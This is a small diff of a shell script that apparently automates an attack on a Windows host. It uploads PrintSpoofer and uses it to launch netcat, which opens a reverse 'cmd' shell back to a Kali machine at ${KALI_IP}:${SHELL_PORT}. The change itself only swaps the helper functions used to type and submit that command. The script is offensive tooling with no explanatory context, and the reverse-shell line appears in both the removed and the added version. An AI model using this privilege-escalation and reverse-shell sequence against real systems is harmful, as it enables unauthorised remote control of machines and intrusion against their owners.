@@ -32,5 +32,5 @@ cmd_upload_file "${LOCATION}" "${FILE}"
 PRINTSPOOFER_FILE_LOCATION="${FILE_LOCATION}"
 sleep 3
 
-paste_command "${PRINTSPOOFER_FILE_LOCATION} -c \"${NC_FILE_LOCATION} ${KALI_IP} ${SHELL_PORT} -e cmd\""
-xdotool key Return
+execute_command "${PRINTSPOOFER_FILE_LOCATION} -c \"${NC_FILE_LOCATION} ${KALI_IP} ${SHELL_PORT} -e cmd\""
+create_new_line
